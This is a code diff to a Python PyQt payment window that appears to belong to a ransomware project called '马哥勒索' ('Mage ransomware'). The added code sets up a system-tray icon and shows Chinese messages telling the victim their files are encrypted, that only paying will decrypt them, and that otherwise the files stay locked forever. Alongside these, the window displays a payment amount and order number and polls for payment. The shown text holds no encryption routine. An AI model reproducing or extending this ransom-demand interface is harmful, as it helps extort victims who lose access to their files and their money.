@@ -59,7 +59,6 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         self.setAttribute(QtCore.Qt.WA_TranslucentBackground) # 设置窗口背景透明
         # 去掉窗口标题栏、去掉任务栏显示、窗口置顶、禁止关闭窗口
         # self.setWindowFlags(QtCore.Qt.FramelessWindowHint|QtCore.Qt.WindowStaysOnTopHint|QtCore.Qt.Tool|QtCore.Qt.WindowMinimizeButtonHint)
-
         self.widget.setStyleSheet(widget_style1)
         self.widget_2.setStyleSheet(widget_style2)
         # 结束页面
@@ -77,6 +76,12 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         self.pushButton_2.setStyleSheet(button_style)
 
         self.init_window(self.out_trade_no, self.total_amount)
+    def iconActivated(self):
+        self.tray.showMessage(u"马哥勒索", '你的文件被加密了', icon=1)    
+        time.sleep(1)
+        self.tray.showMessage(u"马哥勒索", '只有给马哥钱才能解密', icon=2)    
+        time.sleep(1)
+        self.tray.showMessage(u"马哥勒索", '否则你的文件将永远尘封', icon=3)    
 
     # 初始化界面
     def init_window(self, out_trade_no, total_amount):
@@ -84,6 +89,8 @@ class Pay_window(QMainWindow, Ui_PayWindow):
         self.label_2.setScaledContents(True)    # 让图片自适应label大小
         self.label.setText(f'请支付{total_amount}元')
         self.print_logs(f'交易创建 订单号:{out_trade_no} 付款金额:{total_amount}')
+        self.tray.setIcon(QtGui.QIcon(CUR_PATH+'\\icon.png')) #设置系统托盘图标
+        self.tray.show()
 
         self.thread = threading.Thread(target=self.query_order, args=(self.out_trade_no,))
         self.thread.setDaemon(True)
